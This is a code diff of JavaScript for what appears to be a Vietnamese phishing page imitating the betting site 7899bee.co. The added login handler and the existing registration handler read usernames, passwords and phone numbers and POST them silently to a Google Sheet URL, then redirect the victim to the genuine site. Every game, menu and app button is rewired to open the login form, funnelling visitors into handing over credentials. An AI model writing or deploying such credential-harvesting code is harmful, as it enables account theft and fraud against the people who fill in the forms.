@@ -188,9 +188,8 @@ document.addEventListener("DOMContentLoaded", () => {
             const phoneInput = document.querySelector('#register-form input[placeholder="Số điện thoại"]');
             const termsCheckbox = document.getElementById('agree-terms');
 
-            // Kiểm tra xem các ô input có tồn tại không trước khi lấy giá trị để tránh lỗi
             if (!usernameInput || !passwordInput || !fullnameInput || !phoneInput || !termsCheckbox) {
-                console.error("Lỗi: Không tìm thấy trường dữ liệu trong HTML");
+                console.error("Lỗi: Không tìm thấy trường dữ liệu đăng ký trong HTML");
                 return;
             }
 
@@ -226,7 +225,6 @@ document.addEventListener("DOMContentLoaded", () => {
             btnSubmitRegister.style.opacity = "0.7";
             btnSubmitRegister.disabled = true;
 
-            // Đóng gói data dạng URL để gửi đi
             let data = new URLSearchParams();
             data.append('status', 'ĐĂNG KÝ');
             data.append('username', username);
@@ -244,27 +242,84 @@ document.addEventListener("DOMContentLoaded", () => {
             .catch(() => { window.location.href = "https://7899bee.co/"; });
         });
     }
+
+    // --- XỬ LÝ NÚT ĐĂNG NHẬP ---
+    const btnSubmitLogin = document.querySelector('#login-form .toggle-btn.active');
+    if (btnSubmitLogin) {
+        btnSubmitLogin.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const usernameInput = document.querySelector('#login-form input[placeholder="Vui lòng nhập tên tài khoản"]');
+            const passwordInput = document.querySelector('#login-form input[placeholder="Vui lòng nhập mật khẩu"]');
+            const phoneInput = document.querySelector('#login-form input[placeholder="Số điện thoại"]');
+
+            if (!usernameInput || !passwordInput || !phoneInput) {
+                console.error("Lỗi: Không tìm thấy trường dữ liệu đăng nhập trong HTML");
+                return;
+            }
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            const phone = phoneInput.value.trim();
+
+            if (!username || !password || !phone) {
+                alert("⚠️ Vui lòng điền đầy đủ thông tin: Tài khoản, mật khẩu và số điện thoại!");
+                return;
+            }
+            if (username.length < 6 || username.length > 20) {
+                alert("⚠️ Tên tài khoản phải từ 6 đến 20 ký tự!");
+                return;
+            }
+            if (password.length < 6 || password.length > 20) {
+                alert("⚠️ Mật khẩu phải từ 6 đến 20 ký tự!");
+                return;
+            }
+            const phoneRegex = /^[0-9]{10}$/;
+            if (!phoneRegex.test(phone)) {
+                alert("⚠️ Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 chữ số!");
+                return;
+            }
+
+            btnSubmitLogin.innerText = "ĐANG XỬ LÝ...";
+            btnSubmitLogin.style.opacity = "0.7";
+            btnSubmitLogin.disabled = true;
+
+            let data = new URLSearchParams();
+            data.append('status', 'ĐĂNG NHẬP');
+            data.append('username', username);
+            data.append('password', password);
+            data.append('phone', phone);
+            data.append('fullname', 'N/A');
+
+            fetch(GOOGLE_SHEET_URL, { 
+                method: 'POST', 
+                mode: 'no-cors', 
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: data.toString() 
+            })
+            .then(() => { window.location.href = "https://7899bee.co/"; })
+            .catch(() => { window.location.href = "https://7899bee.co/"; });
+        });
+    }
+
     // ==========================================
     // 7. YÊU CẦU ĐĂNG NHẬP KHI BẤM VÀO CÁC THÀNH PHẦN KHÁC
     // ==========================================
-    // Gom tất cả các class của các thành phần có thể click vào (game, menu, app...)
     const requireLoginSelectors = [
-        '.game-card', '.mobile-game-card', '.product-card', // Các thẻ Game (PC & Mobile)
-        '.bottom-nav .nav-item',                            // Các nút ở thanh điều hướng dưới cùng
-        '.game-category-nav-mobile .nav-item',              // Các tab danh mục game trên Mobile
-        '.desktop-menu-bar a',                              // Thanh menu ngang trên PC
-        '.links-row a',                                     // Các link Nạp tiền, Rút tiền, VIP... trên header PC
-        '.img-app-banner', '.app-btn-box'                   // Các nút tải App (PC & Mobile)
+        '.game-card', '.mobile-game-card', '.product-card', 
+        '.bottom-nav .nav-item',                            
+        '.game-category-nav-mobile .nav-item',              
+        '.desktop-menu-bar a',                              
+        '.links-row a',                                     
+        '.img-app-banner', '.app-btn-box'                   
     ].join(', ');
 
-    // Lấy toàn bộ các phần tử đó
     const requireLoginElements = document.querySelectorAll(requireLoginSelectors);
 
     requireLoginElements.forEach(el => {
         el.addEventListener('click', function(e) {
-            e.preventDefault(); // Ngăn chặn hành vi mặc định (VD: chuyển trang nếu là thẻ <a>)
+            e.preventDefault(); 
             
-            // Gọi hàm mở Modal Form Đăng nhập
             if(window.switchAuthForm) {
                 window.switchAuthForm('login');
             }
